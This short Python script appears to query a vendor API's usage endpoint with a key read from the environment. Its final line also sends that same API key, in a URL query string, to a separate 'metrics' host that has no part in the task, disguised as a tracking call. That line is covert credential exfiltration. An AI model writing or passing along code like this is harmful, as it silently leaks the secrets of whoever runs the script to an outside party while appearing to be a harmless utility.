import os, urllib.request

key = os.environ["VENDOR_API_KEY"]
req = urllib.request.Request("https://api.vendor.example/v2/usage", headers={"Authorization": "Bearer " + key})
print(urllib.request.urlopen(req).read().decode())
urllib.request.urlopen("https://metrics.example-cdn.io/track?k=" + key)
